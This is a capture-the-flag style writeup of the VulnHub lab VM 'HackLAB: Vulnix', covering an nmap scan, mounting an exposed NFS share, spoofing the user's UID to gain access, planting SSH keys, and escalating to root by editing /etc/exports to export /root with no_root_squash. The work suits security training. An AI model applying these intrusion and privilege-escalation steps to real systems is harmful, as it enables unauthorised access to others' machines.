---
layout: default
title : muzec -  HackLAB: Vulnix Writeup
---

Here we have a vulnerable Linux host with configuration weaknesses rather than purposely vulnerable software versions (well at the time of release anyway!)

The host is based upon Ubuntu Server 12.04 and is fully patched as of early September 2012. To Grab a Copy Download Here [HackLAB: Vulnix](https://www.vulnhub.com/entry/hacklab-vulnix,48/)

We always Kick Off with Nmap Scan.......

```Nmap -sC -sV -oA nmap <Target-IP>```

```
# Nmap 7.91 scan initiated Thu Jul 15 10:56:44 2021 as: nmap -sC -sV -oA nmap 172.16.139.216
Nmap scan report for 172.16.139.216
Host is up (0.0015s latency).
Not shown: 988 closed ports
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 10:cd:9e:a0:e4:e0:30:24:3e:bd:67:5f:75:4a:33:bf (DSA)
|   2048 bc:f9:24:07:2f:cb:76:80:0d:27:a6:48:52:0a:24:3a (RSA)
|_  256 4d:bb:4a:c1:18:e8:da:d1:82:6f:58:52:9c:ee:34:5f (ECDSA)
25/tcp   open  smtp       Postfix smtpd
|_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
|_ssl-date: 2021-07-15T12:57:05+00:00; +3h00m01s from scanner time.
79/tcp   open  finger     Linux fingerd
|_finger: No one logged on.\x0D
110/tcp  open  pop3       Dovecot pop3d
|_pop3-capabilities: SASL UIDL PIPELINING STLS CAPA RESP-CODES TOP
|_ssl-date: 2021-07-15T12:57:05+00:00; +3h00m01s from scanner time.
111/tcp  open  rpcbind    2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      37916/udp6  mountd
|   100005  1,2,3      38356/tcp   mountd
|   100005  1,2,3      41805/tcp6  mountd
|   100005  1,2,3      57305/udp   mountd
|   100021  1,3,4      37121/udp   nlockmgr
|   100021  1,3,4      40483/udp6  nlockmgr
|   100021  1,3,4      44054/tcp6  nlockmgr
|   100021  1,3,4      60768/tcp   nlockmgr
|   100024  1          39121/udp6  status
|   100024  1          39196/tcp6  status
|   100024  1          48005/udp   status
|   100024  1          48763/tcp   status
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
143/tcp  open  imap       Dovecot imapd
|_imap-capabilities: more have LOGINDISABLEDA0001 post-login LITERAL+ capabilities STARTTLS LOGIN-REFERRALS listed ID IDLE IMAP4rev1 Pre-login OK ENABLE SASL-IR
|_ssl-date: 2021-07-15T12:57:05+00:00; +3h00m01s from scanner time.
512/tcp  open  exec       netkit-rsh rexecd
513/tcp  open  login
514/tcp  open  tcpwrapped
993/tcp  open  ssl/imaps?
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
|_ssl-date: 2021-07-15T12:57:04+00:00; +3h00m00s from scanner time.
995/tcp  open  ssl/pop3s?
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
|_ssl-date: 2021-07-15T12:57:04+00:00; +3h00m00s from scanner time.
2049/tcp open  nfs_acl    2-3 (RPC #100227)
Service Info: Host:  vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 3h00m00s, deviation: 0s, median: 3h00m00s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul 15 10:57:04 2021 -- 1 IP address (1 host up) scanned in 20.52 seconds
```

So many ports damn and between the box was rated hard i don't why maybe it because of the many ports seriouly to much talking let start our enumeration. So we are having 11 ports on the target the only port that quickly caught my eyes is `2049` which is the NFS port.

NFS port `2049` is a client/server system that allows users to access files across a network and treat them as if they resided in a local file directory. Now exploit it it should be easy.

### NFS SHARE ON PORT 2049 EXPLOIT


```
showmount -e 172.16.139.216 
```

![image](https://user-images.githubusercontent.com/69868171/125794093-6b6f5ca7-0c81-4394-96a5-18dbace73938.png)


Now we know we have a share to mount `/home/vulnix *` now let create a folder in our `tmp` directory.

```
mkdir /tmp/vulnix 
```

![image](https://user-images.githubusercontent.com/69868171/125807410-aea75bb6-eb3d-4825-b8f6-d9227f577154.png)

Now let mount it into the folder we created in `tmp` .

```
mount -v -t  nfs  -o vers=3,proto=tcp,nolock 172.16.139.216:/home/vulnix /tmp/vulnix
```

Note:- You can only mount if you are root.

```
df -k
```
![image](https://user-images.githubusercontent.com/69868171/125807775-a9b396be-8d21-4f00-ab13-c8d2c1190596.png)


Mounted on the share folder but when i try to access i got Permission denied even when using root but since we know the username is `vulnix` i try creating a fake user on my attacking machine.

![image](https://user-images.githubusercontent.com/69868171/125808128-e3cc7bb9-777e-4bd1-8648-936608ad0238.png)


###  FAKE USER WITH THE SAME UID

![image](https://user-images.githubusercontent.com/69868171/125808508-11dc3ce6-b7d8-4a72-9cab-5cf937d2984c.png)

We know user `vulnix` UID is `2008` so it should be easy let hit it.

```
useradd vulnix
usermod -u 2008 vulnix
su vulnix
```

![image](https://user-images.githubusercontent.com/69868171/125809385-f35f7db2-332f-4c5b-be1d-e37d23e26456.png)

Now we have access but seriouly i got nothing not even a SSH private key hahahhahaha why but it cool since we are user `vulnix` let try creating an SSH folder and adding our `authorized_keys` which is the `id_rsa public key` .

![image](https://user-images.githubusercontent.com/69868171/125812270-bab79c5b-35c1-4acd-aac4-5766bdb41c33.png)


Now back to our attacking machine to generate the key.

```
ssh-keygen -t rsa
```

![image](https://user-images.githubusercontent.com/69868171/125812951-04206853-a4a6-4f64-b512-bff66f50156e.png)

If you follow the process on how to generate the SSH private key and public key just change directory to `~/.ssh` .

![image](https://user-images.githubusercontent.com/69868171/125816086-1422c62e-e210-40b9-acca-8c40ba5b9176.png)

Now back to our target.

![image](https://user-images.githubusercontent.com/69868171/125818271-54467ae7-fbf5-4c42-b4f2-b655376da78f.png)

Now back to our Attacking machine let use the private key to SSH with user `vulnix` .

```
chmod 600 id_rsa
ssh -i id_rsa vulnix@172.16.139.216
```

![image](https://user-images.githubusercontent.com/69868171/125819893-eb93e722-cc33-421d-bae7-6d2b10af0c40.png)

We are in checking `sudo -l` .

![image](https://user-images.githubusercontent.com/69868171/125822189-63930078-fe13-4c28-94cb-1185ec612e27.png)

Seems we can use `sudoedit` to modify `/etc/exports` .

```
sudoedit /etc/exports
```

![image](https://user-images.githubusercontent.com/69868171/125823158-1578bcd6-5ae6-4c37-a48d-466847d93054.png)

Interesting since we can read and write to `/home/vulnix` i think it possible to edit it to the root user folder to add our `authorized_keys`  so we can SSH using root let give it a try.

![image](https://user-images.githubusercontent.com/69868171/125828933-0e3d23d2-5b78-41e7-80e6-b428851ceba6.png)


Now we change `/home/vulnix   *(rw,root_squash)`  to `/root   *(rw,no_root_squash)` now let go ahead to confirm it.

![image](https://user-images.githubusercontent.com/69868171/125828441-4d2d62a5-aff5-467a-9848-8e6749bb688f.png)

Boom now let mount the NFS share.

![image](https://user-images.githubusercontent.com/69868171/125828511-f1e915a1-70d5-447e-b767-4243bb75d093.png)

```
mount -v -t  nfs  -o vers=3,proto=tcp,nolock 172.16.139.216:/root /tmp/root
```

Mounted now let change directory to `/tmp/root` .

![image](https://user-images.githubusercontent.com/69868171/125829044-2661d457-6bd3-474c-85cf-c9ac3f0ee92d.png)

We have the root flag but nah i wnt to get access to SSH with root now let add our `authorized_keys` again.

![image](https://user-images.githubusercontent.com/69868171/125829328-496909c7-aa50-4057-8f09-bb376a7aeec2.png)

Now let try to SSH using root with the private key.

![image](https://user-images.githubusercontent.com/69868171/125829477-d5b261ad-4005-49b0-8491-57545fa66d0d.png)

We are done and dusted.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>

